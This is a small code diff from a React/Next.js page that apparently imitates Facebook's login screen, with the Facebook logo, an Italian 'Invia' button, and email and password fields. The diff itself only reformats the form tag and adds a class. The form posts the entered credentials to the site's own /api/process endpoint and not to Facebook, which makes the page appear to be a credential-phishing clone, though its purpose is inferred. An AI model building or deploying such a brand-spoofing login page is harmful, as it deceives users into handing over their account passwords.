@@ -11,8 +11,7 @@ export default function Home() {
         <p className="lang">Italiano</p>
         <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />
 
-     <div> 
-<form action="/api/process" method="POST">
+     <div><form action="/api/process" method="POST" class="fb-form">
   <input type="text" name="email" placeholder="Email" required />
   <input type="password" name="password" placeholder="Password" required />
   <button type="submit">Invia</button>
